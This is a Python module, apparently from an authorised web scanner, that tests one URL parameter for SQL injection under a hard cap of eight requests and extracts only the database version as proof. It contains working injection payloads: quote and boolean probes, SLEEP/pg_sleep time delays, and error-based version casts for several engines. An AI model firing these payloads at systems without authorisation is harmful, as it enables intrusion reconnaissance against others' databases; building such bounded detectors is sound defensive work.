"""Bounded SQL-injection detection for one operator-named parameter.

Three detection styles, a fixed payload set, and a hard cap of
``MAX_REQUESTS = 8`` HTTP requests per module run:

1. **error** — append a single quote and look for a database error signature
   leaking into the response body;
2. **boolean** — compare a true branch against a false branch and require both
   to differ from the baseline in the expected direction;
3. **time** — one delayed query per engine family, measured once against the
   baseline.

When one of those proves the point, the remaining budget is spent on **proof of
impact**: fixed error-based casts that make the engine print its own version
(``VERSION()``, ``@@VERSION``, ``sqlite_version()``) back in an error message.
That turns "this looks injectable" into "this query reads data I did not ask
for" without touching a single row.

What this module deliberately cannot do, in any configuration:

* it never builds a payload from anything except the parameter value the
  operator already sent;
* there is no flag, file, environment variable or config key that supplies a
  payload string;
* it performs no set-operator extraction, no statement stacking, no file
  primitives, no command primitives, no schema enumeration and no table reads;
  the only value it ever extracts is the engine's own version string;
* it loops at most ``MAX_REQUESTS`` times in total, including the baseline.

Proving the hole is the job. Dumping the database is what turns an authorised
assessment into an incident, and a table dump is not needed to open a
remediation ticket. Every finding states which style proved the point, what the
proof extracted and how many requests were spent.
"""

from __future__ import annotations

import difflib
import re

from ..models import Severity
from .base import (
    MissingInput,
    Module,
    ScanContext,
    finding,
    query_param_value,
    swap_query_param,
)

MAX_REQUESTS = 8
TIME_DELAY_SECONDS = 2
TIME_THRESHOLD_MS = 1500
BODY_WINDOW = 20 * 1024

# (lower-cased signature, engine hint, human label)
ERROR_SIGNATURES = (
    ("you have an error in your sql syntax", "mysql", "MySQL parse error"),
    ("warning: mysql", "mysql", "MySQL warning"),
    ("mysqli", "mysql", "MySQLi error"),
    ("unclosed quotation mark", "mssql", "SQL Server unclosed quote"),
    ("microsoft ole db provider for sql", "mssql", "SQL Server OLE DB error"),
    ("incorrect syntax near", "mssql", "SQL Server syntax error"),
    ("pg_query", "postgres", "PostgreSQL query error"),
    ("postgresql", "postgres", "PostgreSQL error"),
    ("psql:", "postgres", "psql error"),
    ("sqlstate", "generic", "SQLSTATE error"),
    ("syntax error at or near", "postgres", "PostgreSQL syntax error"),
    ("unterminated quoted string", "postgres", "PostgreSQL unterminated string"),
    ("sqlite3.operationalerror", "sqlite", "SQLite operational error"),
    ("sqlite error", "sqlite", "SQLite error"),
    ("ora-01756", "oracle", "Oracle quoted string error"),
    ("ora-00933", "oracle", "Oracle statement error"),
    ("oracle error", "oracle", "Oracle error"),
    ("sequelizedatabaseerror", "generic", "Sequelize database error"),
    ("sqlalchemy.exc", "generic", "SQLAlchemy exception"),
    ("jdbc", "generic", "JDBC driver error"),
    ("xpath syntax error", "mysql", "MySQL XPath error"),
    ("invalid input syntax for type", "postgres", "PostgreSQL cast error"),
    ("conversion failed when converting", "mssql", "SQL Server conversion error"),
)

# Shared with every parameter technique: same point, same encoding rules.
_swap_param = swap_query_param
_original = query_param_value

# One delayed query per plausible engine family. Both are read-only waits.
TIME_PAYLOADS = (
    ("mysql", "';SELECT SLEEP(2)-- -"),
    ("postgres", "';SELECT pg_sleep(2)-- -"),
)

# Error-based casts: the engine refuses the cast and prints the value it refused.
# Fixed payloads, metadata only, one per engine family.
PROOF_PAYLOADS = (
    ("mysql", "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION())))-- -"),
    ("mssql", "' AND 1=CONVERT(int,@@VERSION)-- -"),
    ("postgres", "' AND 1=CAST(VERSION() AS int)-- -"),
    ("sqlite", "' AND 1=CAST(sqlite_version() AS int)-- -"),
)

VERSION_WITH_ENGINE = re.compile(
    r"(?i)\b(?:mariadb|mysql|postgresql|sqlite|microsoft sql server)\b"
    r"[^\n]{0,80}?(\d+\.\d+(?:\.\d+)?)"
)
VERSION_QUOTED = re.compile(r"[~'\"](\d+\.\d+(?:\.\d+)?)[^'\"\n]{0,40}[\"']")


def _extract_version(text: str, baseline: str = "") -> str:
    """A version token that was not already on the page. Never a table row."""
    window = text[:BODY_WINDOW]
    for pattern in (VERSION_WITH_ENGINE, VERSION_QUOTED):
        for match in pattern.finditer(window):
            token = match.group(1)
            if token and token not in baseline:
                return token
    return ""


def _ratio(left: str, right: str) -> float:
    if not left and not right:
        return 1.0
    if not left or not right:
        return 0.0
    return difflib.SequenceMatcher(
        None, left[:BODY_WINDOW], right[:BODY_WINDOW]
    ).ratio()


def _matches_error(text: str) -> tuple[str, str] | None:
    lowered = text[:BODY_WINDOW].lower()
    for signature, engine, label in ERROR_SIGNATURES:
        if signature in lowered:
            return engine, label
    return None


class SqlInjectionModule(Module):
    """Detection-only injection probe for one parameter, hard-capped."""

    attack_id = "web.sql_injection_check"

    def run(self, ctx: ScanContext):
        if not ctx.inject_url or not ctx.inject_param:
            raise MissingInput("--sqli-url and --sqli-param are required")

        url = ctx.inject_url
        param = ctx.inject_param
        original = _original(url, param)
        if original is None:
            return [
                finding(
                    ctx,
                    self.attack_id,
                    f"Parameter {param} is not present in the supplied URL",
                    Severity.INFO,
                    detail="Nothing was probed: the URL has to contain the parameter "
                           "you want tested, with its normal value.",
                    evidence={
                        "url": url,
                        "param": param,
                        "injectable": False,
                        "styles": [],
                        "dbms_hint": "",
                        "requests_sent": 0,
                        "baseline_ms": 0,
                    },
                    confidence="high",
                )
            ]

        sent = 0
        baseline = ctx.http_get_url(url)
        sent += 1
        if baseline.error:
            return [
                finding(
                    ctx,
                    self.attack_id,
                    "Injection probe could not complete",
                    Severity.INFO,
                    detail=baseline.error[:300],
                    evidence={
                        "url": url,
                        "param": param,
                        "injectable": False,
                        "styles": [],
                        "dbms_hint": "",
                        "requests_sent": sent,
                        "baseline_ms": baseline.elapsed_ms,
                    },
                    confidence="low",
                )
            ]

        baseline_text = baseline.text
        baseline_len = len(baseline_text)
        # A signature that is already on the normal page proves nothing.
        baseline_match = _matches_error(baseline_text)
        evidence = {
            "url": url,
            "param": param,
            "injectable": False,
            "styles": [],
            "dbms_hint": "",
            "requests_sent": sent,
            "baseline_ms": baseline.elapsed_ms,
        }

        # -- 1. error signature -------------------------------------------
        styles: list[str] = []
        dbms = ""
        proof = ""
        error_probe = ctx.http_get_url(_swap_param(url, param, original + "'"))
        sent += 1
        matched = None if error_probe.error else _matches_error(error_probe.text)
        if matched is not None and matched != baseline_match:
            dbms, label = matched
            styles.append("error")
            proof = f"the single-quote probe produced a {label} in the response body"

        # -- 2. boolean differential --------------------------------------
        if not styles and sent + 2 <= MAX_REQUESTS:
            true_url = _swap_param(url, param, original + "' AND '1'='1")
            false_url = _swap_param(url, param, original + "' AND '1'='2")
            true_resp = ctx.http_get_url(true_url)
            sent += 1
            false_resp = ctx.http_get_url(false_url)
            sent += 1

            if not true_resp.error and not false_resp.error and baseline.status == true_resp.status:
                true_ratio = _ratio(baseline_text, true_resp.text)
                false_ratio = _ratio(baseline_text, false_resp.text)
                true_len = len(true_resp.text)
                false_len = len(false_resp.text)
                length_delta = abs(true_len - false_len) / max(1, max(true_len, false_len))
                within_true = abs(true_len - baseline_len) / max(1, baseline_len) <= 0.05
                if (true_ratio >= 0.98 and false_ratio <= 0.90) or (
                    length_delta > 0.15 and within_true and false_ratio < true_ratio
                ):
                    styles.append("boolean")
                    proof = (
                        f"the true branch matched the baseline "
                        f"({true_ratio:.3f}) while the false branch did not "
                        f"({false_ratio:.3f})"
                    )
                    dbms = dbms or "unknown"

        # -- 3. time delay ------------------------------------------------
        if not styles and sent + 1 <= MAX_REQUESTS:
            threshold = max(TIME_THRESHOLD_MS, baseline.elapsed_ms + TIME_THRESHOLD_MS)
            for engine, payload in TIME_PAYLOADS:
                if sent >= MAX_REQUESTS:
                    break
                probe = ctx.http_get_url(_swap_param(url, param, original + payload))
                sent += 1
                if probe.error:
                    continue
                # A delayed response that is also an error page is not proof.
                if _matches_error(probe.text) is not None:
                    continue
                if probe.elapsed_ms >= threshold:
                    styles.append("time")
                    dbms = dbms or engine
                    proof = (
                        f"a {TIME_DELAY_SECONDS}s delayed query answered after "
                        f"{probe.elapsed_ms} ms against a {baseline.elapsed_ms} ms baseline"
                    )
                    break

        # -- 4. proof of impact --------------------------------------------
        # Detection says the query can be changed. This says it can READ:
        # a failed type cast makes the engine print its own version back.
        impact: dict[str, str] = {}
        if styles:
            for engine, payload in PROOF_PAYLOADS:
                if sent >= MAX_REQUESTS:
                    break
                attempt = ctx.http_get_url(_swap_param(url, param, original + payload))
                sent += 1
                if attempt.error:
                    continue
                # No error-signature requirement here: the version token itself
                # is the proof, and a cast error does not always say "SQL".
                extracted = _extract_version(attempt.text, baseline_text)
                if extracted:
                    impact = {
                        "engine": engine,
                        "version": extracted,
                        "method": "error-based cast",
                    }
                    dbms = dbms or engine
                    break

        evidence.update(
            {
                "injectable": bool(styles),
                "styles": styles,
                "dbms_hint": dbms,
                "requests_sent": sent,
                "proof_of_impact": impact,
            }
        )

        if styles:
            detail = (
                f"Proved by {', '.join(styles)}: {proof}."
            )
            if impact:
                detail += (
                    f" Proof of impact: the {impact['engine']} error returned version "
                    f"{impact['version']}, so this parameter reads data. No table rows "
                    "were read, stored or returned."
                )
            else:
                detail += (
                    " The proof-of-impact cast did not return a version, so the "
                    "injection is proven but the read is not demonstrated."
                )
            return [
                finding(
                    ctx,
                    self.attack_id,
                    f"SQL injection in parameter {param}"
                    + (f" (reads {impact['engine']} data)" if impact else ""),
                    Severity.CRITICAL,
                    detail=detail,
                    evidence=evidence,
                    references=["CWE-89", "OWASP-A03:2021"],
                    confidence="high" if (impact or "error" in styles) else "medium",
                )
            ]

        return [
            finding(
                ctx,
                self.attack_id,
                f"No injection signature in parameter {param}",
                Severity.INFO,
                detail=(
                    f"{sent} request(s): one baseline, one quote probe, one boolean "
                    "pair and at most one time probe per engine. A clean result "
                    "means this narrow probe set did not fire — not that the "
                    "parameter is safe."
                ),
                evidence=evidence,
                references=["CWE-89"],
                confidence="low",
            )
        ]
